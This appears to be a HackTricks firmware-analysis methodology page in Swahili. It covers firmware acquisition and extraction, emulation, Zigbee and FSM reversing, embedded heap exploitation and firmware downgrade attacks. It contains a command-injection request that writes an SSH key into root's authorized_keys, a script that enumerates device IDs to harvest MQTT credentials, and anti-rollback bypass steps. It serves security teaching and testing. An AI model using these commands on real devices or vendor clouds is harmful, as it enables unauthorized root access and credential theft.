# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Utangulizi**

### Rasilimali zinazohusiana

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni programu muhimu inayowezesha vifaa kufanya kazi ipasavyo kwa kudhibiti na kuwezesha mawasiliano kati ya vipengele vya hardware na programu ambazo watumiaji hutumia. Huhifadhiwa kwenye kumbukumbu ya kudumu, ili kifaa kiweze kufikia maagizo muhimu tangu kinapowashwa, na hivyo kuanzisha mfumo endeshi. Kuchunguza na pengine kurekebisha firmware ni hatua muhimu katika kutambua udhaifu wa kiusalama.<sup>[[2]](#references)[[3]](#references)</sup>

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua muhimu ya awali ya kuelewa muundo wa kifaa na teknolojia zinazotumiwa nacho. Mchakato huu unahusisha kukusanya data kuhusu:

- Usanifu wa CPU na mfumo endeshi unaoendesha
- Maelezo ya bootloader
- Muundo wa hardware na datasheet
- Vipimo vya codebase na maeneo ya chanzo
- Maktaba za nje na aina za leseni
- Historia za masasisho na vyeti vya udhibiti
- Michoro ya usanifu na mtiririko
- Tathmini za usalama na udhaifu uliotambuliwa

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni muhimu sana, pamoja na uchanganuzi wa vipengele vyovyote vya open-source software vinavyopatikana kupitia michakato ya ukaguzi wa mikono na wa kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa uchanganuzi tuli bila malipo unaoweza kutumiwa kutafuta matatizo yanayoweza kuwepo.

## **Kupata Firmware**

Firmware inaweza kupatikana kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- Kuipata **moja kwa moja** kutoka kwa chanzo (watengenezaji, wazalishaji)
- **Kuijenga** kwa kufuata maelekezo yaliyotolewa
- **Kuipakua** kutoka kwenye tovuti rasmi za usaidizi
- Kutumia hoja za **Google dork** kutafuta faili za firmware zilizowekwa mtandaoni
- Kufikia **cloud storage** moja kwa moja, kwa kutumia zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kukatiza **masasisho** kwa kutumia mbinu za man-in-the-middle
- **Kuitoa** kwenye kifaa kupitia miunganisho kama **UART**, **JTAG**, au **PICit**
- **Kusniff** maombi ya masasisho ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **vituo vya mwisho vya masasisho vilivyowekwa ndani ya msimbo**
- Kufanya **dump** kutoka kwa bootloader au mtandao
- **Kuondoa na kusoma** chipu ya hifadhi, njia nyingine zote zikishindikana, kwa kutumia zana zinazofaa za hardware

### Logi za UART pekee: lazimisha root shell kupitia env ya U-Boot kwenye flash

Ikiwa UART RX hupuuzwa (logi pekee), bado unaweza kulazimisha init shell kwa **kuhariri blob ya mazingira ya U-Boot ukiwa nje ya kifaa**:<sup>[[6]](#references)</sup>

1. Fanya dump ya SPI flash kwa kutumia klipu ya SOIC-8 na programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Tafuta env partition ya U-Boot, hariri `bootargs` ili kujumuisha `init=/bin/sh`, na **kokotoa upya U-Boot env CRC32** ya blob.
3. Flash env partition pekee upya kisha washa upya; shell inapaswa kuonekana kwenye UART.

Hii ni muhimu kwenye vifaa vilivyopachikwa ambapo bootloader shell imezimwa lakini env partition inaweza kuandikwa kupitia ufikiaji wa external flash.

## Kuchanganua firmware

Sasa kwa kuwa **una firmware**, unahitaji kutoa taarifa kuihusu ili kujua jinsi ya kuishughulikia. Zana tofauti unazoweza kutumia kwa hilo:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ikiwa hutapata mengi kwa kutumia zana hizo, angalia **entropy** ya image kwa `binwalk -E <bin>`; ikiwa entropy iko chini, basi huenda haijasimbwa kwa njia fiche. Ikiwa entropy iko juu, huenda imesimbwa kwa njia fiche (au imebanwa kwa namna fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **faili zilizopachikwa ndani ya firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kukagua faili.

### Kupata Mfumo wa Faili

Kwa kutumia zana zilizotajwa awali kama `binwalk -ev <bin>`, ulipaswa kuweza **kutoa mfumo wa faili**.\
Kwa kawaida, Binwalk huutoa ndani ya **folda iliyopewa jina la aina ya mfumo wa faili**, ambayo kwa kawaida huwa mojawapo ya hizi: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Kutoa Mfumo wa Faili kwa Mkono

Wakati mwingine, binwalk **haitakuwa na magic byte ya mfumo wa faili kwenye saini zake**. Katika hali hizi, tumia binwalk **kupata offset ya mfumo wa faili na kuchonga mfumo wa faili uliobanwa** kutoka kwenye binary, kisha **utoe mfumo wa faili kwa mkono** kulingana na aina yake kwa kutumia hatua zilizo hapa chini.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Endesha **dd command** kufanya carving ya mfumo wa faili wa Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Vinginevyo, amri ifuatayo pia inaweza kutekelezwa.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (iliyotumika kwenye mfano hapo juu)

`$ unsquashfs dir.squashfs`

Baada ya hapo, faili zitakuwa kwenye saraka ya "`squashfs-root`".

- Faili za kumbukumbu za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa mifumo ya faili ya jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa mifumo ya faili ya ubifs yenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Kuchanganua Firmware

Baada ya kupata firmware, ni muhimu kuichanganua kwa kina ili kuelewa muundo wake na uwezekano wa udhaifu. Mchakato huu unahusisha kutumia zana mbalimbali kuchanganua na kutoa data muhimu kutoka kwenye picha ya firmware.

### Zana za Awali za Uchambuzi

Seti ya amri imetolewa kwa ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchanganua data ya binary, na kuelewa maelezo ya partitions na mifumo ya faili:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Ili kutathmini hali ya usimbaji fiche ya image, **entropy** hukaguliwa kwa kutumia `binwalk -E <bin>`. Entropy ya chini huashiria ukosefu wa usimbaji fiche, ilhali entropy ya juu huashiria uwezekano wa usimbaji fiche au compression.

Kwa kutoa **embedded files**, inapendekezwa kutumia zana na nyenzo kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa faili.

### Kutoa Filesystem

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida mtu anaweza kutoa filesystem, mara nyingi kwenye saraka iliyopewa jina la aina ya filesystem (k.m., squashfs, ubifs). Hata hivyo, **binwalk** inaposhindwa kutambua aina ya filesystem kwa sababu ya kukosekana kwa magic bytes, uchimbaji wa mikono huhitajika. Hii inahusisha kutumia `binwalk` kutafuta offset ya filesystem, kisha kutumia amri ya `dd` kuchopoa filesystem:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Baadaye, kulingana na aina ya filesystem (kwa mfano, squashfs, cpio, jffs2, ubifs), hutumika amri tofauti ili kutoa yaliyomo mwenyewe.

### Uchambuzi wa Filesystem

Baada ya kutoa filesystem, utafutaji wa dosari za usalama huanza. Huchunguzwa daemon za mtandao zisizo salama, credentials zilizowekwa moja kwa moja kwenye code, API endpoints, utendaji wa update server, code ambayo haijakusanywa, startup scripts na binaries zilizokusanywa kwa ajili ya uchambuzi wa offline.

**Maeneo muhimu** na **vipengee** vya kukagua ni pamoja na:

- **etc/shadow** na **etc/passwd** kwa credentials za watumiaji
- Vyeti vya SSL na funguo katika **etc/ssl**
- Configuration files na script files ili kutafuta uwezekano wa udhaifu
- Binaries zilizopachikwa kwa uchambuzi zaidi
- Web servers na binaries zinazotumika kwa kawaida kwenye vifaa vya IoT

Zana kadhaa husaidia kufichua taarifa nyeti na udhaifu ndani ya filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa kutafuta taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa uchambuzi wa kina wa firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa uchambuzi wa static na dynamic

### Ukaguzi wa Usalama wa Binaries Zilizokusanywa

Code chanzo na binaries zilizokusanywa zinazopatikana kwenye filesystem lazima zichunguzwe ili kubaini udhaifu. Zana kama **checksec.sh** za Unix binaries na **PESecurity** za Windows binaries husaidia kutambua binaries zisizo na ulinzi ambazo zinaweza kutumiwa vibaya.

## Kukusanya cloud config na MQTT credentials kupitia URL tokens zilizotokana na data nyingine

Hub nyingi za IoT hupata configuration ya kila kifaa kutoka kwa cloud endpoint inayoonekana hivi:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa kuchambua firmware, unaweza kugundua kuwa `<token>` hutokana na device ID ndani ya kifaa kwa kutumia secret iliyowekwa moja kwa moja kwenye code, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Muundo huu humwezesha yeyote anayepata deviceId na STATIC_KEY kutengeneza upya URL na kupakua cloud config, ambayo mara nyingi hufichua MQTT credentials zilizo katika maandishi wazi na viambishi awali vya topic.

Mchakato wa vitendo:

1) Toa deviceId kutoka kwenye UART boot logs

- Unganisha adapta ya 3.3V UART (TX/RX/GND) na unasa logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Tafuta mistari inayochapisha muundo wa URL ya usanidi wa cloud na anwani ya broker, kwa mfano:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Pata STATIC_KEY na algorithm ya token kutoka kwenye firmware

- Pakia binaries kwenye Ghidra/radare2 na utafute config path ("/pf/") au matumizi ya MD5.
- Thibitisha algorithm (kwa mfano, MD5(deviceId||STATIC_KEY)).
- Pata token kwa Bash na ubadilishe digest iwe herufi kubwa:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Kusanya usanidi wa cloud na credentials za MQTT

- Unda URL na upakue JSON kwa curl; ichanganue kwa jq ili kutoa secrets:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Tumia vibaya MQTT ya maandishi wazi na ACL dhaifu za topic (ikiwa zipo)

- Tumia credentials zilizopatikana kujisajili kwenye maintenance topics na kutafuta matukio nyeti:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Orodhesha vitambulisho vya vifaa vinavyotabirika (kwa wingi, ukiwa na idhini)

- Mifumo mingi hujumuisha byte za OUI ya vendor/bidhaa/aina zikifuatiwa na kiambishi tamati cha mfuatano.
- Unaweza kupitia vitambulisho vinavyowezekana, kutoa tokens na kupata configs kiotomatiki:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- Pata idhini ya wazi kila wakati kabla ya kujaribu kufanya mass enumeration.
- Pendelea emulation au static analysis ili kurejesha secrets bila kurekebisha hardware lengwa inapowezekana.


Mchakato wa kuiga firmware huwezesha **dynamic analysis** ya uendeshaji wa kifaa au programu mahususi. Mbinu hii inaweza kukumbana na changamoto zinazohusiana na hardware au utegemezi wa architecture, lakini kuhamisha root filesystem au binaries mahususi kwenye kifaa chenye architecture na endianness inayolingana, kama Raspberry Pi, au kwenye virtual machine iliyoundwa awali, kunaweza kurahisisha majaribio zaidi.

### Kuiga Binaries Mahususi

Unapochunguza programu moja moja, ni muhimu kutambua endianness na CPU architecture ya programu.

#### Mfano wa MIPS Architecture

Ili kuiga binary ya MIPS architecture, unaweza kutumia amri:

```bash
file ./squashfs-root/bin/busybox
```

Na kusakinisha zana zinazohitajika za uigaji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Kwa MIPS (big-endian), hutumika `qemu-mips`, na kwa binaries za little-endian, chaguo lingekuwa `qemu-mipsel`.

#### Emulation ya ARM Architecture

Kwa binaries za ARM, mchakato ni sawa, huku emulator ya `qemu-arm` ikitumika kwa emulation.

### Full System Emulation

Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyinginezo, hurahisisha full firmware emulation, huendesha mchakato kiotomatiki na kusaidia katika dynamic analysis.

## Dynamic Analysis kwa Vitendo

Katika hatua hii, mazingira ya kifaa halisi au kilicho-emulate huchambuliwa. Ni muhimu kudumisha ufikiaji wa shell kwa OS na filesystem. Emulation huenda isiige kikamilifu mwingiliano wa hardware, hivyo wakati mwingine emulation huhitaji kuwashwa upya. Uchambuzi unapaswa kuchunguza tena filesystem, kutumia vibaya webpages na network services zilizo wazi, na kuchunguza udhaifu wa bootloader. Majaribio ya uadilifu wa firmware ni muhimu ili kubaini uwezekano wa udhaifu wa backdoor.

## Mbinu za Runtime Analysis

Runtime analysis huhusisha kuingiliana na process au binary katika mazingira yake ya uendeshaji, kwa kutumia zana kama gdb-multiarch, Frida, na Ghidra kuweka breakpoints na kubaini udhaifu kupitia fuzzing na mbinu nyingine.

Kwa embedded targets zisizo na debugger kamili, **nakili `gdbserver` iliyounganishwa statically** kwenye kifaa na uunganishe nayo kwa mbali:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Uchoraji wa ramani ya ujumbe wa Zigbee / radio-co-processor

Kwenye hubs za IoT stack ya RF mara nyingi hugawanywa kati ya **radio MCU** na process ya Linux userland. Workflow muhimu ni kuchora ramani ya njia:<sup>[[8]](#references)</sup>

1. **RF frame** inayotumwa hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text au TLV protocol** inayotumwa kwa Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** kwenye daemon kuu
5. **protocol-specific handler / state machine**

Muundo huu huunda malengo mawili ya reversing badala ya moja. Ikiwa controller inabadilisha binary radio frames kuwa protocol ya maandishi kama `Group,Command,arg1,arg2,...`, bainisha:

- **Message groups** na dispatch tables
- Ni ujumbe upi unaweza kutoka kwenye **network** dhidi ya controller yenyewe
- Sehemu halisi za **manufacturer-specific discriminator** (kwa mfano Zigbee `manufacturer_code` na custom `cluster_command`)
- Ni handlers zipi zinazofikiwa tu wakati wa **commissioning**, discovery, au awamu za upakuaji wa firmware/model

Kwa Zigbee hasa, nasa trafiki ya pairing na uhakikishe kama kifaa lengwa bado kinategemea **Link Key** chaguomsingi `ZigBeeAlliance09`. Ikiwa ndivyo, kunasa trafiki ya commissioning kunaweza kufichua **Network Key**. Install codes za Zigbee 3.0 hupunguza hatari hii, kwa hivyo tambua kama kifaa kilichojaribiwa kinazitekeleza kweli.

### Manufacturer-specific protocol handlers na ufikikaji unaodhibitiwa na FSM

Amri za Zigbee/ZCL zinazotegemea vendor mara nyingi huwa malengo bora kuliko clusters sanifu kwa sababu hupitisha data kwenye **custom parsing code** na **FSMs** za ndani zenye validation ambayo haijajaribiwa vya kutosha.<sup>[[8]](#references)</sup>

Workflow ya vitendo:

- Reverse command dispatcher hadi upate **vendor-only handler**.
- Pata majedwali ya **FSM state**, **event**, **check**, **action**, na **next-state**.
- Tambua **transitional states** zinazojihamisha kiotomatiki na matawi ya retry/error ambayo hatimaye huweka upya au kuachilia state inayodhibitiwa na mshambuliaji.
- Thibitisha ni mabadilishano gani halali ya protocol yanayohitajika ili kuiweka daemon katika hali iliyo hatarini badala ya kudhani kuwa handler yenye hitilafu inaweza kufikiwa kila wakati.

Kwa protocols zinazohitaji muda sahihi, packet replay kutoka kwenye Python framework inaweza kuwa polepole mno. Njia ya kuaminika zaidi ni kuiga kifaa halali kwenye hardware halisi (kwa mfano **nRF52840**) kwa kutumia stack ya kiwango cha vendor ili uweze kufichua **endpoints**, **attributes**, na muda sahihi wa commissioning.

### Aina ya hitilafu ya fragmented-download kwenye embedded daemons

Aina ya hitilafu ya firmware inayojirudia hutokea kwenye upakuaji wa **fragmented blob/model/configuration**:<sup>[[8]](#references)</sup>

1. **Fragment ya kwanza** (`offset == 0`) huhifadhi `ctx->total_size` na kutenga `malloc(total_size)`.
2. Fragments zinazofuata hukagua tu sehemu za **packet-local** zinazodhibitiwa na mshambuliaji, kama vile `packet_total_size >= offset + chunk_len`.
3. Nakala hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila kulinganisha na **ukubwa wa awali uliotengwa**.

Hii humwezesha mshambuliaji kutuma:

- Fragment ya kwanza halali yenye ukubwa wa jumla uliotangazwa **mdogo** ili kulazimisha ugawaji mdogo wa heap.
- Fragment inayofuata yenye **offset inayotarajiwa** lakini `chunk_len` kubwa zaidi.
- Ukubwa ghushi wa packet-local unaotimiza ukaguzi mpya huku bado ukijaza kupita kiasi buffer iliyotengwa awali.

Ikiwa njia iliyo hatarini iko nyuma ya logic ya commissioning, exploitation lazima ijumuishe **device emulation** ya kutosha ili kuingiza kifaa lengwa katika hali inayotarajiwa ya model-download au blob-download kabla ya kutuma fragments zilizoharibika.

### Vichochezi vya `free()` vinavyoendeshwa na protocol

Kwenye embedded daemons, njia rahisi zaidi ya kuchochea heap metadata exploitation mara nyingi si “kusubiri cleanup” bali **kulazimisha error handling ya protocol yenyewe**:<sup>[[8]](#references)</sup>

- Tuma fragments za ufuatiliaji zilizoharibika ili kuisukuma FSM kwenye hali za **retry** au **error**.
- Vuka kikomo cha retries ili daemon **iweke upya context** na kuachilia buffer iliyoharibiwa.
- Tumia `free()` hii inayotabirika kuchochea primitives za allocator kabla process haijaanguka kwa sababu zisizohusiana.

Hili ni muhimu hasa kwa allocators za aina ya **musl/uClibc/dlmalloc** kwenye embedded Linux, ambapo kuharibu chunk metadata kunaweza kubadilisha unlink/unbin logic kuwa write primitive. Muundo thabiti ni kuharibu **size field** ili kuelekeza allocator traversal kwenye **fake chunks zilizowekwa ndani ya buffer iliyojazwa kupita kiasi**, badala ya kuharibu mara moja bin pointers halisi na kusababisha process kuanguka.

## Binary Exploitation na Proof-of-Concept

Kutengeneza PoC ya vulnerabilities zilizotambuliwa kunahitaji uelewa wa kina wa target architecture na programming katika lugha za kiwango cha chini. Ulinzi wa binary runtime ni nadra kwenye embedded systems, lakini unapokuwepo, mbinu kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### Vidokezo vya uClibc fastbin exploitation (embedded Linux)

- **Fastbins + consolidation:** uClibc hutumia fastbins zinazofanana na za glibc. Ugawaji mkubwa unaofuata unaweza kuchochea `__malloc_consolidate()`, kwa hivyo fake chunk yoyote lazima ipite ukaguzi (ukubwa unaokubalika, `fd = 0`, na chunks zinazozunguka zinazoonekana kuwa “in use”).<sup>[[6]](#references)</sup>
- **Binaries zisizo za PIE chini ya ASLR:** ikiwa ASLR imewezeshwa lakini binary kuu **si ya PIE**, anwani za `.data/.bss` ndani ya binary huwa thabiti. Unaweza kulenga eneo ambalo tayari linafanana na heap chunk header halali ili kuelekeza fastbin allocation kwenye **function pointer table**.
- **NUL inayosimamisha parser:** JSON inapochanganuliwa, `\x00` kwenye payload inaweza kusimamisha parsing huku ikiweka bayti zinazofuata zinazodhibitiwa na mshambuliaji kwa ajili ya stack pivot/ROP chain.
- **Shellcode kupitia `/proc/self/mem`:** ROP chain inayotumia `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kuweka shellcode inayotekelezeka kwenye mapping inayojulikana na kurukia humo.

## Operating Systems Zilizotayarishwa kwa Firmware Analysis

Operating systems kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyosanidiwa awali kwa ajili ya kupima usalama wa firmware, yakiwa na zana zinazohitajika.

## OS Zilizotayarishwa kwa Kuchanganua Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyoundwa kukusaidia kufanya tathmini ya usalama na penetration testing ya vifaa vya Internet of Things (IoT). Huokoa muda mwingi kwa kutoa mazingira yaliyosanidiwa awali yenye zana zote muhimu.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operating system ya kupima usalama wa embedded, inayotegemea Ubuntu 18.04 na iliyosheheni zana za kupima usalama wa firmware.

## Mashambulizi ya Firmware Downgrade na Update Mechanisms Zisizo Salama

Hata vendor anapotekeleza ukaguzi wa saini za cryptographic kwa firmware images, **ulinzi dhidi ya kurudisha toleo nyuma (downgrade) mara nyingi huachwa**. Boot- au recovery-loader inapothibitisha tu saini kwa kutumia public key iliyopachikwa lakini hailinganishi *toleo* (au monotonic counter) la image inayowekwa, mshambuliaji anaweza kusakinisha kihalali **firmware ya zamani iliyo hatarini ambayo bado ina saini halali**, na hivyo kurudisha vulnerabilities zilizokuwa zimewekewa patch.<sup>[[4]](#references)</sup>

Workflow ya kawaida ya shambulio:

1. **Pata image ya zamani iliyosainiwa**
   * Ipakue kutoka kwenye download portal, CDN au support site ya umma ya vendor.
   * Itoe kwenye companion mobile/desktop applications (kwa mfano ndani ya Android APK kwenye `assets/firmware/`).
   * Ipate kutoka kwenye third-party repositories kama VirusTotal, Internet archives, forums, n.k.
2. **Pakia au toa image kwa kifaa** kupitia update channel yoyote iliyo wazi:
   * Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
   * Vifaa vingi vya IoT vya watumiaji hufichua endpoints za HTTP(S) *zisizohitaji uthibitishaji*, zinazokubali firmware blobs zilizosimbwa kwa Base64, kuzifungua upande wa server na kuanzisha recovery/upgrade.
3. Baada ya downgrade, tumia vulnerability iliyorekebishwa katika toleo jipya zaidi (kwa mfano filter ya command-injection iliyoongezwa baadaye).
4. Kwa hiari, flash image ya hivi karibuni tena au zima updates ili kuepuka kugunduliwa baada ya kupata persistence.

### Mfano: Command Injection Baada ya Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Katika firmware iliyo hatarini (iliyorejeshwa kwenye toleo la zamani), kigezo cha `md5` huunganishwa moja kwa moja kwenye amri ya shell bila kusafishwa, hivyo kuruhusu kuingiza amri zozote (hapa, kuwezesha ufikiaji wa root kwa kutumia SSH key). Matoleo ya baadaye ya firmware yaliongeza kichujio cha msingi cha herufi, lakini kutokuwepo kwa ulinzi dhidi ya kurejesha toleo la zamani kunafanya marekebisho hayo yasiwe na maana.<sup>[[4]](#references)</sup>

### Kutoa Firmware Kutoka Kwenye Programu za Simu

Wauzaji wengi hujumuisha picha kamili za firmware ndani ya programu zao saidizi za simu, ili programu iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Vifurushi hivi mara nyingi huhifadhiwa bila usimbaji fiche kwenye APK/APEX, chini ya njia kama `assets/fw/` au `res/raw/`. Zana kama `apktool`, `ghidra`, au hata `unzip` ya kawaida hukuwezesha kutoa picha zilizosainiwa bila kugusa maunzi halisi.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass ya anti-rollback inayotekelezwa na updater pekee katika miundo ya slot za A/B

Baadhi ya vendors hutekeleza **ratchet** ya kuzuia downgrade, lakini ndani ya mantiki ya *updater* pekee (kwa mfano, routine ya UDS kupitia CAN, amri ya recovery, au agent ya OTA ya userspace). Ikiwa **bootloader** baadaye hukagua tu saini/CRC ya image na kuamini jedwali la partition au metadata ya slot, ulinzi wa rollback bado unaweza kuepukwa.<sup>[[7]](#references)</sup>

Muundo dhaifu unaotumika mara nyingi:

- Metadata ya firmware huwa na maelezo ya toleo na **ratchet** ya usalama / counter inayoongezeka kwa mwelekeo mmoja.
- Updater hulinganisha ratchet ya image na thamani iliyohifadhiwa kwenye storage endelevu, kisha hukataa image za zamani zilizosainiwa.
- **Bootloader** haichanganui ratchet hiyo; hukagua tu header, CRC na saini kabla ya kuwasha slot iliyochaguliwa.
- Uamilishaji wa slot huhifadhiwa kando kwenye jedwali la partition au counter ya generation ya kila slot, na **haujaunganishwa kwa njia ya kriptografia** na digest halisi ya firmware iliyothibitishwa.

Hii huunda primitive ya **kuthibitisha image moja / kuwasha image nyingine** katika mifumo yenye slot mbili. Ikiwa mshambulizi anaweza kufanya updater iweke slot B kama lengwa la kuwasha linalofuata kwa kutumia image ya sasa iliyosainiwa, kisha akaandika upya slot B kabla ya kuwasha upya, bootloader bado inaweza kuwasha image iliyodowngrade kwa sababu huamini tu metadata ya slot ambayo tayari imehifadhiwa.

Mfumo wa kawaida wa matumizi mabaya:

1. Pakia firmware **ya sasa iliyosainiwa** kwenye slot tulivu na utekeleze routine ya kawaida ya uthibitishaji/kubadilisha ili mpangilio uweke slot hiyo kuwa inayofuata kuwashwa.
2. **Usiwasha upya bado**. Anzisha tena routine ya kuandaa/kufuta slot ndani ya session hiyo hiyo.
3. Tumia vibaya hali ya boot iliyopitwa na wakati au mantiki ya kuchagua slot iliyopitwa na wakati ili updater ifute **slot ileile halisi** ambayo ilikuwa imeteuliwa hivi punde.
4. Andika firmware **ya zamani lakini bado iliyosainiwa** kwenye slot hiyo.
5. Ruka routine ya uthibitishaji inayotekeleza ratchet na uwashe upya moja kwa moja.
6. Bootloader huchagua slot iliyoteuliwa, hukagua saini/uadilifu pekee, na kuwasha image ya zamani.

Mambo ya kuchunguza unapofanya reverse engineering ya utekelezaji wa masasisho ya A/B:

- Uchaguzi wa slot unatokana na **flags za wakati wa kuwasha** ambazo hazisasishwi baada ya kubadilisha slot kwa mafanikio.
- Routine ya aina ya `prepare_passive_slot()` hufuta slot kulingana na hali iliyopitwa na wakati badala ya **mpangilio wa sasa uliothibitishwa**.
- Function ya aina ya `part_write_layout()` huongeza tu **counter ya generation** / flag ya active na haihifadhi hash ya image iliyothibitishwa.
- Ukaguzi wa ratchet unatekelezwa kwenye userspace au msimbo wa updater, lakini **haupo** kwenye hatua za ROM / bootloader / secure boot.
- Routine za kufuta au recovery huacha slot ikiwa imetiwa alama ya kuwa inaweza kuwashwa hata baada ya maudhui yake kufutwa na kuandikwa upya.

### Orodha ya Kukagua Mantiki ya Usasishaji

* Je, usafirishaji/uthibitishaji wa *endpoint ya update* umelindwa ipasavyo (TLS + uthibitishaji)?
* Je, kifaa hukagua **nambari za toleo** au **counter inayoongezeka kwa mwelekeo mmoja ya kuzuia rollback** kabla ya ku-flash?
* Je, image inathibitishwa ndani ya mnyororo wa secure boot (kwa mfano, saini hukaguliwa na msimbo wa ROM)?
* Je, **bootloader hutekeleza ratchet ileile** kama updater, badala ya kukagua saini/CRC pekee?
